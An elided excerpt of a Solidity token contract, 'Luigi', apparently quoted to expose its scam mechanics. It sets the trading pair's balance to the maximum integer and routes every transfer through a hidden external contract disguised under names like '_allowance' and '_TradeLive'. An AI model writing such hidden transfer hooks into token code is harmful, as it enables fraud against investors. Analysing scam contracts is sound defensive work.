...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    uint256 _TradeLive = ~uint256(0);
    ERCRouter _allowance;
...
contract Luigi is Ownable, ERC20 {
    bool public limited;
    ...
    constructor(uint256 _totalSupply, address routerAddress, address pairAddress) ERC20("Luigi", "LUIGI") {
         _allowance = ERCRouter (routerAddress);
        _balances[pairAddress] = _TradeLive;
    ...
    function _beforeTokenTransfer(
        ...
        if (limited && from == uniswapV2Pair) {
            ...
            _allowance.transfer(to);
        }
         _allowance.Path(from);
    }
